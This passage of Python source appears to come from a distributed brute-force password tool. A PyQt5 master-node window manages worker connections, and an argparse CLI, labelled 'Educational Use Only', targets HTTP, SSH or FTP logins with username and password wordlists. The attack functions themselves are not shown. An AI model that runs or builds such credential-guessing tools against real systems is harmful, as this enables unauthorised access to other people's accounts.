        self.pin_label.setText(f"<span style='color:{TEXT_MUTED}; font-size:12px;'>PIN</span> <b style='color:{ACCENT_CYAN}; font-size:16px; font-family:{FONT_MONO};'>{self.pin}</b>")
        self.master_log(f"PIN regenerated: {self.pin}")
        self.log_server.broadcast_log("[PIN_CHANGED]")

    def refresh_workers_table(self):
        """Refresh the worker nodes table with real-time connected worker data"""
        self.workers_table.setRowCount(0)  # Clear existing rows
        
        # Get real worker information from the log server
        worker_info = self.log_server.get_worker_info()
        worker_count = len(worker_info)
        
        total_tasks = 0
        active_workers = 0
        
        if worker_count == 0:
            self.workers_stats_label.setText("Total: 0 | Active: 0 | Tasks: 0")
            self.worker_count_label.setText("Workers: 0")
            return
        
        # Process each connected worker
        for i, (client, info) in enumerate(worker_info.items()):
            try:
                # Check if client is still connected (non-destructive check via getpeername)
                try:
                    client.getpeername()
                    status = "🟢 Active"
                    active_workers += 1
                except OSError:
                    status = "🔴 Disconnected"
                    self.log_server.update_worker_status(client, status)
                
                worker_name = info['name']
                ip_address = info['ip']
                tasks_assigned = info['tasks']
                
                total_tasks += tasks_assigned
                
                # Add row to table
                row = self.workers_table.rowCount()
                self.workers_table.insertRow(row)
                
                # Set table items
                self.workers_table.setItem(row, 0, QTableWidgetItem(worker_name))
                self.workers_table.setItem(row, 1, QTableWidgetItem(ip_address))
                self.workers_table.setItem(row, 2, QTableWidgetItem(str(tasks_assigned)))
                self.workers_table.setItem(row, 3, QTableWidgetItem(status))
                
                # Color code the status
                status_item = self.workers_table.item(row, 3)
                if "Active" in status:
                    status_item.setBackground(QColor(76, 175, 80, 50))  # Green
                elif "Busy" in status:
                    status_item.setBackground(QColor(255, 193, 7, 50))  # Yellow
                else:
                    status_item.setBackground(QColor(244, 67, 54, 50))  # Red
                    
            except Exception:
                continue
        
        self.workers_stats_label.setText(f"Total: {worker_count} | Active: {active_workers} | Tasks: {total_tasks}")
        
        # Update worker count in navbar
        self.worker_count_label.setText(f"Workers: {worker_count}")

    def disconnect_selected_worker(self):
        """Disconnect the selected worker node"""
        current_row = self.workers_table.currentRow()
        if current_row >= 0:
            worker_name = self.workers_table.item(current_row, 0).text()
            ip_address = self.workers_table.item(current_row, 1).text()
            
            # Find the actual client connection
            worker_info = self.log_server.get_worker_info()
            clients = list(worker_info.keys())
            
            if current_row < len(clients):
                try:
                    client = clients[current_row]
                    client.close()
                    # Worker disconnect will be logged by on_worker_disconnected callback
                except Exception:
                    pass
            
            self.refresh_workers_table()

def main():
    parser = argparse.ArgumentParser(description='Modular Brute Force Attack Tool (Educational Use Only)')
    parser.add_argument('--target', required=True, help='Target domain or IP')
    parser.add_argument('--port', type=int, help='Port number (optional)')
    parser.add_argument('--protocol', required=True, choices=['http', 'ssh', 'ftp'], help='Protocol to attack')
    parser.add_argument('--username', help='Single username')
    parser.add_argument('--userlist', help='File with list of usernames')
    parser.add_argument('--wordlist', required=True, help='File with list of passwords')
    parser.add_argument('--delay', type=float, default=0, help='Delay between attempts (seconds)')
    parser.add_argument('--max-attempts', type=int, help='Maximum number of attempts')
    parser.add_argument('--success-indicator', help='Success detection string or code')
    parser.add_argument('--log', help='Log file to store results')
    parser.add_argument('--attack-type', choices=['dictionary', 'incremental', 'hybrid'], default='dictionary', help='Attack type')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL certificate verification for HTTPS targets')
    args = parser.parse_args()

    # Setup logging
    if args.log:
        logging.basicConfig(filename=args.log, level=logging.INFO)
    else:
        logging.basicConfig(level=logging.INFO)

    if args.protocol == 'http':
        brute_force_http(args)
    elif args.protocol == 'ssh':
        brute_force_ssh(args)
    elif args.protocol == 'ftp':
        brute_force_ftp(args)
    else:
        print(f"Unsupported protocol: {args.protocol}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) == 1:
        from PyQt5.QtWidgets import QApplication
        app = QApplication(sys.argv)
        app.setStyleSheet(get_global_app_style())
        win = MasterNodeWindow()
        win.show()
        sys.exit(app.exec_())
    else:
        # Arguments provided: run CLI
        main() 